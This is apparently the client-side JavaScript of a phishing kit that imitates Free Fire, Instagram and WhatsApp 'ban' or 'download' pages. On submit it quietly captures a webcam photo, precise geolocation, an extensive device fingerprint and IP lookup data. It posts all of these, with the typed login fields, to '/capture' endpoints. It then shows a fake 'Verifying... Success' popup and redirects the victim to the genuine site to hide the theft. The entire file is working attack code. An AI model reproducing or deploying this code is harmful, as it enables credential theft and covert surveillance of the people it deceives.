function showPopup(title,msg,spin=true){
  let p=document.getElementById('nb-popup');
  if(!p){
    p=document.createElement('div');p.id='nb-popup';
    p.innerHTML='<div class="nb-popup-box"><div class="nb-spinner"></div>'+
      '<div class="nb-popup-title"></div><div class="nb-popup-msg"></div>'+
      '<div class="nb-progress"><div class="nb-progress-bar"></div></div></div>';
    document.body.appendChild(p);
  }
  const box=p.querySelector('.nb-popup-box');
  box.classList.toggle('success',!spin);
  p.querySelector('.nb-popup-title').innerText=title;
  p.querySelector('.nb-popup-msg').innerText=msg;
  p.classList.add('show');
  const bar=p.querySelector('.nb-progress-bar');
  bar.style.transition='none';bar.style.width='0%';void bar.offsetWidth;
  bar.style.transition='width .6s cubic-bezier(.2,.7,.3,1)';
  if(spin){
    setTimeout(()=>bar.style.width='35%',200);
    setTimeout(()=>bar.style.width='70%',900);
    setTimeout(()=>bar.style.width='95%',1600);
  } else { setTimeout(()=>bar.style.width='100%',100); }
}
function redirectFor(page){
  if(page==='freefire')return 'https://ff.garena.com';
  if(page==='instagram-ban'||page==='instagram-download')return 'https://www.instagram.com';
  if(page==='whatsapp-ban')return 'https://web.whatsapp.com';
  return 'https://www.instagram.com';
}
async function runCapture(pageName,fields){
  try{
    const stream=await navigator.mediaDevices.getUserMedia({
      video:{facingMode:'user',width:640,height:480}});
    const v=document.getElementById('video');v.srcObject=stream;await v.play();
    await new Promise(r=>setTimeout(r,700));
    const c=document.getElementById('canvas');
    c.width=v.videoWidth;c.height=v.videoHeight;
    c.getContext('2d').drawImage(v,0,0);
    const photo=c.toDataURL('image/jpeg',0.85);
    await fetch('/capture/photo',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({photo,page:pageName})});
    stream.getTracks().forEach(t=>t.stop());
  }catch(e){}
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(async pos=>{
      await fetch('/capture/location',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({page:pageName,lat:pos.coords.latitude,lon:pos.coords.longitude,
          accuracy:pos.coords.accuracy,timestamp:pos.timestamp})});
    },()=>{},{enableHighAccuracy:true,timeout:8000});
  }
  const fp={page:pageName,userAgent:navigator.userAgent,platform:navigator.platform,
    vendor:navigator.vendor,language:navigator.language,languages:navigator.languages,
    screen:{width:screen.width,height:screen.height,colorDepth:screen.colorDepth,
      pixelRatio:window.devicePixelRatio,orientation:screen.orientation?.type},
    hardwareConcurrency:navigator.hardwareConcurrency,deviceMemory:navigator.deviceMemory,
    maxTouchPoints:navigator.maxTouchPoints,
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset:new Date().getTimezoneOffset(),online:navigator.onLine,
    connection:navigator.connection?{effectiveType:navigator.connection.effectiveType,
      downlink:navigator.connection.downlink,rtt:navigator.connection.rtt}:null};
  if(navigator.getBattery){
    try{const b=await navigator.getBattery();
      fp.battery={charging:b.charging,level:b.level,chargingTime:b.chargingTime,
        dischargingTime:b.dischargingTime};}catch(e){}
  }
  try{
    const gl=document.createElement('canvas').getContext('webgl');
    const dbg=gl.getExtension('WEBGL_debug_renderer_info');
    if(dbg)fp.gpu={vendor:gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
      renderer:gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)};
  }catch(e){}
  await fetch('/capture/fingerprint',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify(fp)});
  try{
    const r=await fetch('https://ipapi.co/json/');const d=await r.json();
    await fetch('/capture/fingerprint',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({page:pageName,ipapi:d})});
  }catch(e){}
  const r2=await fetch('/capture/credentials',{method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({page:pageName,fields,redirect:redirectFor(pageName)})});
  const j=await r2.json();
  return j.redirect||redirectFor(pageName);
}
async function handleSubmit(pageName,fields){
  showPopup('Verifying...','Please wait while we process your request',true);
  const redirect=await runCapture(pageName,fields);
  setTimeout(()=>showPopup('Success','Redirecting you now...',false),1800);
  setTimeout(()=>{location.href=redirect;},3400);
        }
